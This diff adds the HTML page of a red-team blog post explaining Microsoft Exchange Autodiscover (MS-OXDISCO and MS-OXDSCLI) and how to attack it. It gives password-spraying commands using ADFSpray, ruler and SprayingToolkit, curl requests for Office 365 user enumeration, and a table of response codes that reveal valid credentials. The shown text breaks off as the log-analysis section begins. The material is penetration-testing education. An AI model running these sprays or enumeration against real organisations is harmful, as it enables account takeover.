@@ -1,0 +1,759 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <script type="text/javascript" src="https://latest.cactus.chat/cactus.js"></script>
+  <link rel="stylesheet" href="https://latest.cactus.chat/style.css" type="text/css">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> Autodiscover 101 : [MS-OXDISC] &amp; [MS-OXDISCO] | </title>
+  <link rel = 'canonical' href = '/posts/autodiscover101/'>
+  <meta name="description" content="Red Teamer / Pentester. Focus on Active Directory / Azure / Windows logical bug">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:title" content="Autodiscover 101 : [MS-OXDISC] &amp; [MS-OXDISCO]" />
+<meta property="og:description" content="0. Autodiscover 101 : A brief introduction We will start this series by analysing the Autodiscover protocol which is being actively used by the differents Exchange endpoints.
+Based on the Microsoft documentation the Autodiscover sevice is part of the &ldquo;Directory/Profile Services&rdquo; which can be broke down into 2 important piece of documentation :
+ [MS-OXDISCO] : Specifies the Autodiscover HTTP Protocol, which will provide a way for the &ldquo;Autodiscover clients to find Autodiscover server&rdquo; by extending the DNS and LDAP services." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/autodiscover101/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-04-25T23:56:41+02:00" />
+<meta property="article:modified_time" content="2022-04-25T23:56:41+02:00" /><meta property="og:site_name" content="Ottersec Blog" />
+
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Autodiscover 101 : [MS-OXDISC] &amp; [MS-OXDISCO]"/>
+<meta name="twitter:description" content="0. Autodiscover 101 : A brief introduction We will start this series by analysing the Autodiscover protocol which is being actively used by the differents Exchange endpoints.
+Based on the Microsoft documentation the Autodiscover sevice is part of the &ldquo;Directory/Profile Services&rdquo; which can be broke down into 2 important piece of documentation :
+ [MS-OXDISCO] : Specifies the Autodiscover HTTP Protocol, which will provide a way for the &ldquo;Autodiscover clients to find Autodiscover server&rdquo; by extending the DNS and LDAP services."/>
+
+  
+  
+    
+  
+  
+  <link rel="stylesheet" href="/css/styles.4c2b9aa1d874d6766f554b2d404e8fd62ab4761f51ee9b3f358d12e81e7fa43a1b4378db995bc1926bbe5ed98c060be5e7bd4f2470504cf94f22b4b3a74e62b6.css" integrity="sha512-TCuaodh01nZvVUstQE6P1iq0dh9R7ps/NY0S6B5/pDobQ3jbmVvBkmu&#43;XtmMBgvl571PJHBQTPlPIrSzp05itg=="> 
+
+  
+  
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="images/favicon.ico" />
+
+  
+  
+  
+  
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+  <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+        <li><a href="/about">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li>
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
+          </a>
+        </li>
+        <li>
+          <a class="icon" href="#" aria-label="Share">
+            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
+          </a>
+        </li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=%2fposts%2fautodiscover101%2f" aria-label="Facebook">
+      <i class="fab fa-facebook " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=%2fposts%2fautodiscover101%2f&text=Autodiscover%20101%20%3a%20%5bMS-OXDISC%5d%20%26%20%5bMS-OXDISCO%5d" aria-label="Twitter">
+      <i class="fab fa-twitter " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=%2fposts%2fautodiscover101%2f&title=Autodiscover%20101%20%3a%20%5bMS-OXDISC%5d%20%26%20%5bMS-OXDISCO%5d" aria-label="Linkedin">
+      <i class="fab fa-linkedin " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=%2fposts%2fautodiscover101%2f&is_video=false&description=Autodiscover%20101%20%3a%20%5bMS-OXDISC%5d%20%26%20%5bMS-OXDISCO%5d" aria-label="Pinterest">
+      <i class="fab fa-pinterest " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=Autodiscover%20101%20%3a%20%5bMS-OXDISC%5d%20%26%20%5bMS-OXDISCO%5d&body=Check out this article: %2fposts%2fautodiscover101%2f" aria-label="Email">
+      <i class="fas fa-envelope " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=%2fposts%2fautodiscover101%2f&title=Autodiscover%20101%20%3a%20%5bMS-OXDISC%5d%20%26%20%5bMS-OXDISCO%5d" aria-label="Pocket">
+      <i class="fab fa-get-pocket " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=%2fposts%2fautodiscover101%2f&title=Autodiscover%20101%20%3a%20%5bMS-OXDISC%5d%20%26%20%5bMS-OXDISCO%5d" aria-label="reddit">
+      <i class="fab fa-reddit " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=%2fposts%2fautodiscover101%2f&name=Autodiscover%20101%20%3a%20%5bMS-OXDISC%5d%20%26%20%5bMS-OXDISCO%5d&description=0.%20Autodiscover%20101%20%3a%20A%20brief%20introduction%20We%20will%20start%20this%20series%20by%20analysing%20the%20Autodiscover%20protocol%20which%20is%20being%20actively%20used%20by%20the%20differents%20Exchange%20endpoints.%0aBased%20on%20the%20Microsoft%20documentation%20the%20Autodiscover%20sevice%20is%20part%20of%20the%20%26ldquo%3bDirectory%2fProfile%20Services%26rdquo%3b%20which%20can%20be%20broke%20down%20into%202%20important%20piece%20of%20documentation%20%3a%0a%20%5bMS-OXDISCO%5d%20%3a%20Specifies%20the%20Autodiscover%20HTTP%20Protocol%2c%20which%20will%20provide%20a%20way%20for%20the%20%26ldquo%3bAutodiscover%20clients%20to%20find%20Autodiscover%20server%26rdquo%3b%20by%20extending%20the%20DNS%20and%20LDAP%20services." aria-label="Tumblr">
+      <i class="fab fa-tumblr " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=%2fposts%2fautodiscover101%2f&t=Autodiscover%20101%20%3a%20%5bMS-OXDISC%5d%20%26%20%5bMS-OXDISCO%5d" aria-label="Hacker News">
+      <i class="fab fa-hacker-news " aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+    
+    <div id="toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#11-ms-oxdisco">1.1 [MS-OXDISCO]</a>
+      <ul>
+        <li><a href="#111-ldap-service-connection-point">1.1.1 LDAP service connection point</a></li>
+        <li><a href="#112-dns-srv-record-">1.1.2 DNS SRV record :</a></li>
+        <li><a href="#113-constructed-domain-uris">1.1.3 Constructed domain URIs</a></li>
+      </ul>
+    </li>
+    <li><a href="#12-ms-oxdscli">1.2 [MS-OXDSCLI]</a>
+      <ul>
+        <li><a href="#121-autodiscover-request">1.2.1 Autodiscover request</a></li>
+        <li><a href="#122-autodiscover-response">1.2.2 Autodiscover response</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#21-unauthenticated-attack">2.1 Unauthenticated attack</a></li>
+    <li><a href="#22-authenticated-abuse">2.2 Authenticated abuse</a></li>
+    <li><a href="#23-bonus--autodiscover-in-the-cloud">2.3 Bonus : Autodiscover in the Cloud</a>
+      <ul>
+        <li><a href="#231-autodiscover-unauthenticated">2.3.1 Autodiscover unauthenticated</a></li>
+        <li><a href="#232-autodiscover-password-spraying">2.3.2 Autodiscover password spraying</a></li>
+      </ul>
+    </li>
+    <li><a href="#24-summary">2.4 Summary</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#31-httpproxy-logs">3.1 HttpProxy logs</a></li>
+    <li><a href="#32-windows-security-logs">3.2 Windows security logs</a></li>
+    <li><a href="#33-autodiscover-logs">3.3 Autodiscover logs</a></li>
+  </ul>
+</nav>
+    </div>
+    
+  </span>
+</div>
+
+
+  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      <h1 class="posttitle" itemprop="name headline">
+        Autodiscover 101 : [MS-OXDISC] &amp; [MS-OXDISCO]
+      </h1>
+      <div class="meta">
+        
+        <div class="postdate">
+          
+          <time datetime="2022-04-25 23:56:41 &#43;0200 CEST" itemprop="datePublished">2022-04-25</time>
+          
+        </div>
+        
+        
+        
+        
+      </div>
+    </header>
+
+  
+    
+    <div class="content" itemprop="articleBody">
+      <h1 id="0-autodiscover-101--a-brief-introduction">0. Autodiscover 101 : A brief introduction</h1>
+<p>We will start this series by analysing the <strong>Autodiscover</strong> protocol which is being actively used by the differents Exchange endpoints.</p>
+<p>Based on the Microsoft documentation the Autodiscover sevice is part of the &ldquo;Directory/Profile Services&rdquo; which can be broke down into 2 important piece of documentation :</p>
+<p><img src="/img/directory_profile_exchange.png" alt="Directory Profile"></p>
+<ul>
+<li><strong>[MS-OXDISCO]</strong> : Specifies the Autodiscover HTTP Protocol, which will provide a way for the &ldquo;Autodiscover clients to find Autodiscover server&rdquo; by extending the DNS and LDAP services. ;</li>
+<li><strong>[MS-OXDSCLI]</strong> : Specifies the Autodiscover publishing/lookup protocol. This will mostly define how the client will retrieve the settings needed to access the web services.</li>
+</ul>
+<p>Both of these protocols works <em>hand in hand</em> and are what defines the Autodiscover endpoint and his inner working. We will break down this article
+in three differents parts :</p>
+<ul>
+<li>Overview of <strong>[MS-OXDISCO]</strong> and <strong>[MS-OXDISCLI]</strong> ;</li>
+<li>Attacking the Autodiscover endpoint ;</li>
+<li>Analysis of the Autodiscover&rsquo;s log.</li>
+</ul>
+<h1 id="1-overview-of-ms-oxdisco-and-ms-oxdscli">1. Overview of [MS-OXDISCO] and [MS-OXDSCLI]</h1>
+<h2 id="11-ms-oxdisco">1.1 [MS-OXDISCO]</h2>
+<hr>
+<p><strong>Summary</strong> : <em>Protocol to discover Autodiscover enpoint by using LDAP,DNS SRV record or constructed URL.</em></p>
+<hr>
+<p>As define in the OXDISCO documentation : <strong>The Autodiscover HTTP Service Protocol provides a way for Autodiscover clients to find Autodiscover servers</strong>.
+In order to find those servers the client will his expand his email address (ex: <a href="mailto:ottersec@conso.com">ottersec@conso.com</a>) to a list of URI  probable autodiscover servers.</p>
+<p>Those URIs can be exposed by one of the following method :</p>
+<ol>
+<li><strong>Service connection point objects</strong> lying within LDAP ;</li>
+<li>DNS entry (SRV record) ;</li>
+<li>Using the domain part of our email address to construct two URLs.</li>
+</ol>
+<p>Based on the definition of this protocol which is rather simple, one can try the following methods in order to try to discover the autodiscover URIs. At least
+one of this method should work if your target is properly using an autodiscover service (not all of them has to be implemented):</p>
+<h3 id="111-ldap-service-connection-point">1.1.1 LDAP service connection point</h3>
+<p>Using an LDAP connection (authenticated) and apply the following filter :</p>
+<pre tabindex="0"><code>(&amp;(objectcategory=serviceConnectionPoint)(|(keywords=67661D7F-8FC4-4fa7-BFAC-E1D7794C1F68)( keywords=77378F46-2C66-4aa9-A6A6-3E7A48B19596)))
+</code></pre><p>The URIs will be stored within the serviceBindingInformation. As the LDAP service of a domain controller is very unlikley to be exposed on the internet, this method is not going to be very usefull for our use case.</p>
+<h3 id="112-dns-srv-record-">1.1.2 DNS SRV record :</h3>
+<p>Let&rsquo;s simply query the defined SRV record in the documentation :</p>
+<pre tabindex="0"><code>_autodiscover._tcp.&lt;domain&gt;
+</code></pre><p>Samely as the first method , chances to see and SRV record populated for the autodiscover exposed on the internet is quite unlikely.</p>
+<h3 id="113-constructed-domain-uris">1.1.3 Constructed domain URIs</h3>
+<p>The last method is to use the domain part of our email address in order to construct two URIs :</p>
+<pre tabindex="0"><code>http://&lt;Domain&gt;/Autodiscover/Autodiscover.xml
+https://Autodiscover.&lt;Domain&gt;/Autodiscover/Autodiscover.xml
+</code></pre><p>This last technique should work in 99.9% of the environement and this is what you should see implemented in most organisations.</p>
+<p>At the end of the day the client (e.g : us as for now !) shoudld be in posession of one/severals URIs which will be hosting the autodiscovery service.</p>
+<p>For the sake of science let&rsquo;s try one of the aformentioned method in our lab :</p>
+<pre tabindex="0"><code>dig srv _autodiscover._tcp.test.local
+
+; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; srv _autodiscover._tcp.test.local
+;; global options: +cmd
+;; Got answer:
+;; WARNING: .local is reserved for Multicast DNS
+;; You are currently testing what happens when an mDNS query is leaked to DNS
+;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 10616
+;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4000
+; COOKIE: 3352a116cfeafeb1 (echoed)
+;; QUESTION SECTION:
+;_autodiscover._tcp.test.local. IN      SRV
+
+;; ANSWER SECTION:
+_autodiscover._tcp.test.local. 3600 IN  SRV     0 0 443 autodiscover.test.local.
+
+;; Query time: 0 msec
+;; SERVER: 192.168.1.89#53(192.168.1.89)
+;; WHEN: Tue Apr 26 20:49:05 CEST 2022
+;; MSG SIZE  rcvd: 113
+</code></pre><p>Bingo, we got our URL leading to the Autodiscover endpoint : <code>autodiscover.test.local</code> !</p>
+<h2 id="12-ms-oxdscli">1.2 [MS-OXDSCLI]</h2>
+<hr>
+<p><strong>Summary</strong> : <em>Protocol to acquire email configuration by sending a crafted XML to an Autodiscover endpoint and receiving an XML as answer containing usefull informations</em></p>
+<hr>
+<p>As stated before the aim of the MS-OXDSCLI protocol is to <em>enable Autodisocver clients to acquire email configuration settings for specific email addresses from the list of Autodiscover servers</em>. As we now know our to discover our Autodiscover servers we will focus on how to obtain this email configuration settings.</p>
+<p>The processus is pretty simple as it is composed in it simplest form of only an HTTP POST request and its associated answer :</p>
+<p><img src="/img/oxdscli_schema.png" alt="Autodiscover request"></p>
+<h3 id="121-autodiscover-request">1.2.1 Autodiscover request</h3>
+<p>The client will send and HTTP request containing an XML to the URL obtained through the MS-OXDISCO. As stated within the documentation thexml is composed of the following :</p>
+<ul>
+<li>A reference to the schema being used.</li>
+<li>The primary email address of the user from which we want to get the configuration</li>
+<li>The schema that we expect to have as an answer.</li>
+</ul>
+<p>Nothing really fancy here as the request is pretty simple. Regarding the authentication method they can be one of the following :</p>
+<ul>
+<li>Basic authentication</li>
+<li>NTLM Authentication</li>
+<li>Kerberos Authentication</li>
+</ul>
+<p>Based on all those inputs we can craft our request that will be addressed to the Autodiscover server.</p>
+<pre tabindex="0"><code>&lt;Autodiscover xmlns=&#34;http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006&#34;&gt;
+    &lt;Request&gt;
+      &lt;EMailAddress&gt;user@domain&lt;/EMailAddress&gt;
+      &lt;AcceptableResponseSchema&gt;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&lt;/AcceptableResponseSchema&gt;
+    &lt;/Request&gt;
+&lt;/Autodiscover&gt;
+</code></pre><h3 id="122-autodiscover-response">1.2.2 Autodiscover response</h3>
+<p>Now that we&rsquo;ve made our query we will receive a delightfull answer containing a trendemous amount of information such as :</p>
+<ul>
+<li>EXCHANGE / DC FQDN : Usefull information to discover internal information.</li>
+<li>OAB/ EWS and OWA Url : Will allow us to locate those in case they&rsquo;re not following a &ldquo;standard&rdquo; naming scheme.</li>
+<li>Shared email boxes if any.</li>
+</ul>
+<p>Let&rsquo;s see an answer in which we have the most interesting part :</p>
+<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
+&lt;Autodiscover xmlns=&#34;http://schemas.microsoft.com/exchange/autodiscover/responseschema/2006&#34;&gt;
+  &lt;Response xmlns=&#34;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&#34;&gt;
+    &lt;User&gt;
+      &lt;DisplayName&gt;user&lt;/DisplayName&gt;
+      ..
+      &lt;PublicFolderServer&gt;exch1.test.local&lt;/PublicFolderServer&gt;
+      &lt;AD&gt;DC.test.local&lt;/AD&gt;
+      ..
+      &lt;EwsUrl&gt;https://exch1.test.local/EWS/Exchange.asmx&lt;/EwsUrl&gt;
+      &lt;OABUrl&gt;https://exch1.test.local/OAB/0703222f-d52a-4a24-84f4-91a23c54dd1d/&lt;/OABUrl&gt;
+      ..
+      &lt;OWAUrl AuthenticationMethod=&#34;Basic, Fba&#34;&gt;https://exch1.test.local/owa/&lt;/OWAUrl&gt;
+      ..
+      &lt;AlternativeMailbox&gt;
+        &lt;Type&gt;Delegate&lt;/Type&gt;
+        &lt;DisplayName&gt;Red Shared Mailbox&lt;/DisplayName&gt;
+        &lt;SmtpAddress&gt;shareredbox@test.local&lt;/SmtpAddress&gt;
+        &lt;OwnerSmtpAddress&gt;shareredbox@test.local&lt;/OwnerSmtpAddress&gt;
+      &lt;/AlternativeMailbox&gt;
+    &lt;/Account&gt;
+  &lt;/Response&gt;
+&lt;/Autodiscover&gt;
+</code></pre><h1 id="2-attacking-the-autodiscover-endpoint">2. Attacking the Autodiscover endpoint</h1>
+<p>In order to tacle the endpoint many differents tools are available, most of them performing very well for this task such as :</p>
+<ul>
+<li>ruler : <a href="https://github.com/sensepost/ruler">https://github.com/sensepost/ruler</a></li>
+<li>adfspray : <a href="https://github.com/xFreed0m/adfspray">https://github.com/xFreed0m/adfspray</a></li>
+<li>carnivore : <a href="https://github.com/ReverendThing/Carnivore">https://github.com/ReverendThing/Carnivore</a> (C#)</li>
+</ul>
+<h2 id="21-unauthenticated-attack">2.1 Unauthenticated attack</h2>
+<hr>
+<p><strong>Possible attack</strong> : <em>Password Spray</em></p>
+<p><strong>Tools</strong>           : <em>curl,ADFSpray,Carnivore,ruler &hellip;</em></p>
+<hr>
+<p>Attacking an autodiscover endpoint from an unauthenticated is what is the more valuable since it allow us to perform an important action : <strong>password spray a list of user</strong>.</p>
+<p>Indeed as we saw before the Autodiscover server <em>provide</em> an endpoint with an authentication methode enabled. This will allow us to spray our constructed list of users.</p>
+<p>Let us suppose we&rsquo;ve been preforming some OSINT and gathered a list of 20 user. Worth nothing to say that we could also have enumerated our users through other means such as ADFS or O365 (more on that below).</p>
+<p>We can now spray our user list thorugh several available tools such as :</p>
+<ul>
+<li>curl (yup, but inefficient!)</li>
+<li>ADFSpray</li>
+<li>ruler</li>
+</ul>
+<p>This list is not exhaustive and i&rsquo;m quite sure you will find plenty other tools that can perform this task.</p>
+<p>Let&rsquo;s now perform our password spraying through different tools as examples :</p>
+<ol>
+<li>ADFSpray</li>
+</ol>
+<pre tabindex="0"><code>python3 ADFSpray.py autodiscover -P password.list -U user.list -t https://exch1.test.local/autodiscover/autodiscover.xml
+</code></pre><p><img src="/img/adfspray_output.png" alt="ADFS Spray">
+2. ruler</p>
+<pre tabindex="0"><code>./ruler-linux64 --domain test.local --url https://exch1.test.local/autodiscover/autodiscover.xml -k brute --users user.list --passwords password.list -v
+</code></pre><p><img src="/img/ruler_output.png" alt="Ruler output"></p>
+<h2 id="22-authenticated-abuse">2.2 Authenticated abuse</h2>
+<hr>
+<p><strong>Possible attack</strong> : <em>Information gathering, User enumeration <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></em></p>
+<p><strong>Tools</strong> : <em>curl,custom script</em></p>
+<hr>
+<p>Depending on the configuration you may or may not need to specify a user agent which mimics Outlook or a non-browser based user agent agent otherwiser you&rsquo;ll be greated with an error 600 such as the following :</p>
+<p><img src="/img/autodiscover_error.png" alt="Autodiscover Error"></p>
+<p>Nevetherless the default UA of curl should work, and you should be welcomed by a quite big XML response. In order to make our request work properly we should create an XML file (e.g : email.xml) with will be in the content of our request :</p>
+<pre tabindex="0"><code>&lt;Autodiscover xmlns=&#34;http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006&#34;&gt;
+    &lt;Request&gt;
+      &lt;EMailAddress&gt;&lt;YOUR EMAIL ADDRESS HERE&gt;&lt;/EMailAddress&gt;
+      &lt;AcceptableResponseSchema&gt;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&lt;/AcceptableResponseSchema&gt;
+    &lt;/Request&gt;
+&lt;/Autodiscover&gt;
+</code></pre><pre tabindex="0"><code>curl -d @email.xml -u anakin@test.local https://exch1.test.local/autodiscover/autodiscover.xml -k --http1.1 -H &#39;Content-Type: text/xml&#39;
+Enter host password for user &#39;anakin@test.local&#39;:
+&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
+&lt;Autodiscover xmlns=&#34;http://schemas.microsoft.com/exchange/autodiscover/responseschema/2006&#34;&gt;
+  &lt;Response xmlns=&#34;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&#34;&gt;
+    &lt;User&gt;
+      &lt;DisplayName&gt;Yoda&lt;/DisplayName&gt;
+      &lt;LegacyDN&gt;/o=Exchange TESTLCOAL/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=15cf7489978146c2ab34263d32b46762-Yoda&lt;/LegacyDN&gt;
+      &lt;AutoDiscoverSMTPAddress&gt;yoda@test.local&lt;/AutoDiscoverSMTPAddress&gt;
+      &lt;DeploymentId&gt;c540eda7-6b1f-4e3d-be0c-7639095021aa&lt;/DeploymentId&gt;
+    &lt;/User&gt;
+    &lt;Account&gt;
+      &lt;AccountType&gt;email&lt;/AccountType&gt;
+      &lt;Action&gt;settings&lt;/Action&gt;
+      &lt;MicrosoftOnline&gt;False&lt;/MicrosoftOnline&gt;
+      &lt;Protocol&gt;
+        &lt;Type&gt;EXCH&lt;/Type&gt;
+       ...
+       ...
+      &lt;AlternativeMailbox&gt;
+        &lt;Type&gt;Delegate&lt;/Type&gt;
+        &lt;DisplayName&gt;Red Shared Mailbox&lt;/DisplayName&gt;
+        &lt;SmtpAddress&gt;shareredbox@test.local&lt;/SmtpAddress&gt;
+        &lt;OwnerSmtpAddress&gt;shareredbox@test.local&lt;/OwnerSmtpAddress&gt;
+      &lt;/AlternativeMailbox&gt;
+    &lt;/Account&gt;
+  &lt;/Response&gt;
+&lt;/Autodiscover&gt;
+</code></pre><p>Based on what we&rsquo;ve discussed before we can extract the following usefull informations from this answer :</p>
+<ul>
+<li>OABURL : <a href="https://exch1.test.local/OAB/0703222f-d52a-4a24-84f4-91a23c54dd1d/">https://exch1.test.local/OAB/0703222f-d52a-4a24-84f4-91a23c54dd1d/</a></li>
+<li>EWS Url : <a href="https://exch1.test.local/EWS/Exchange.asmx">https://exch1.test.local/EWS/Exchange.asmx</a></li>
+<li>DC FQDN : DC.test.local</li>
+<li>Alternative Mailbox : <a href="mailto:sharedredbox@test.local">sharedredbox@test.local</a></li>
+</ul>
+<p>I&rsquo;ve made a simple script that can automate the extraction of all of those informations to be more &ldquo;readable&rdquo; <em>here</em>.</p>
+<p><em>Note : As you can see here we&rsquo;re retreiving information of <strong>Yoda</strong> while authenticating as <strong>Anakin</strong>.This is because in our request we specified <a href="mailto:yoda@test.local">yoda@test.local</a> in the EMailAddress field (which is accepted by the autodiscover endpoint). This is a way to gather informations on different users than the one you have credentials for. To be honest this is not that usefull unless the OAB/OWA and so on are not exposed/available to you as this will allow you to validate the existence of a user and get info</em></p>
+<h2 id="23-bonus--autodiscover-in-the-cloud">2.3 Bonus : Autodiscover in the Cloud</h2>
+<hr>
+<p><strong>Possible attack</strong> : <em>Password spraying, User Enumeration</em></p>
+<p><strong>Tools</strong>           : <em>O365Spray,o365creeper</em>,<em>SprayingToolkit</em></p>
+<hr>
+<h3 id="231-autodiscover-unauthenticated">2.3.1 Autodiscover unauthenticated</h3>
+<p>The Exchange Online feature is quite gentle with us as it allow us to quickly and easily enumerate users.</p>
+<p><em>Quick tip</em> : to quickly know if the target is using o365 a simple <code>host</code> will give you your answer !</p>
+<pre tabindex="0"><code># If it&#39;s using o365 you will get an alias to outlook.com!
+
+host autodiscover autodiscover.&lt;domain&gt;
+autodiscover.&lt;domain&gt; is an alias for autodiscover.outlook.com
+</code></pre><p>How can we enumerate our users then ? Dead simple, microsoft is providing us an easy way to do so :</p>
+<pre tabindex="0"><code>#User does not exist
+curl https://outlook.office365.com/autodiscover/autodiscover.json?Email=fakeuser%40&lt;domain&gt;&amp;Protocol=Autodiscoverv1
+</code></pre><p><img src="/img/doesnotexist.png" alt="Doesnotesit"></p>
+<pre tabindex="0"><code>#User does exist
+curl https://outlook.office365.com/autodiscover/autodiscover.json?Email=user%40&lt;domain&gt;&amp;Protocol=Autodiscoverv1
+</code></pre><p><img src="/img/doesexist.png" alt="Doesexist"></p>
+<h3 id="232-autodiscover-password-spraying">2.3.2 Autodiscover password spraying</h3>
+<p>The password spraying is quite similar as previously stated. The main difference will be the URL that is going to be the same all the time :
+<code>https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml</code></p>
+<p>Not much is required in order to perform our password spraying : only populate our Authorization header suc has :</p>
+<pre tabindex="0"><code>curl --user &lt;email&gt; https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml -v
+</code></pre><p>We can quickly summarize th password spraying on the Autodiscover arround the different error code returned :</p>
+<ul>
+<li>401 : Invalid e-mail (e.g : Enumeration)</li>
+</ul>
+<p><img src="/img/invalid_user_401.png" alt="401bis"></p>
+<ul>
+<li>401 : Invalid password</li>
+</ul>
+<p><img src="/img/invalid_password_401.png" alt="401"></p>
+<ul>
+<li>456 : MFA Required</li>
+</ul>
+<p><img src="/img/mfa_456.png" alt="456"></p>
+<ul>
+<li>200 : Credentials valid !</li>
+</ul>
+<p><img src="/img/creds_ok_200.png" alt="200"></p>
+<p>Several tools allow you to spray against the autodiscover in O365 such as :</p>
+<ul>
+<li>SprayingToolkit : <a href="https://github.com/byt3bl33d3r/SprayingToolkit">https://github.com/byt3bl33d3r/SprayingToolkit</a></li>
+<li>o365spray : <a href="https://github.com/dafthack/MSOLSpray">https://github.com/dafthack/MSOLSpray</a></li>
+</ul>
+<p>Let&rsquo;s try out the SprayingToolkit against some account on our Exchange Online :</p>
+<pre tabindex="0"><code>python3 atomizer.py owa &lt;domain&gt;.onmicrosoft.com &lt;password&gt; emails.txt
+</code></pre><p><img src="/img/validspray.png" alt="validspray"></p>
+<p>And finally let&rsquo;s see the case where MFA is enforced on an account :</p>
+<pre tabindex="0"><code>python3 atomizer.py owa &lt;domain&gt;.onmicrosoft.com &lt;password&gt; emails.txt
+</code></pre><p><img src="/img/mfaspray.png" alt="mfaspray"></p>
+<h2 id="24-summary">2.4 Summary</h2>
+<p>Let&rsquo;s recap here the differents options that we have in our sleeves :</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Password Spraying</th>
+<th>User enumeration brute-force*</th>
+<th>SID Gathering</th>
+<th>Alternate mailbox info</th>
+<th>Services URL Info</th>
+<th>DC FQDN</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Unauthenticated</td>
+<td>x</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>Authenticated</td>
+<td>N/A</td>
+<td>x</td>
+<td></td>
+<td>x</td>
+<td>x</td>
+<td>x</td>
+</tr>
+<tr>
+<td>O365 Unauthenticated</td>
+<td>x</td>
+<td>x</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p><em>User enumeration : With a set of valid credential you should be able to do some user enumeration with a good wordlist. Keep in mind that it is EXTRMELY inefficient since with a set of valid credentials you can dump the OAB through differents methods that we will see in the next article.</em></p>
+<h1 id="3-post-mortem-log-analysis">3. Post mortem log analysis</h1>
+<p>I quickly tried to find logs of interest regarding the differents actions that we performed earlier and endded up with this three potentials sources :</p>
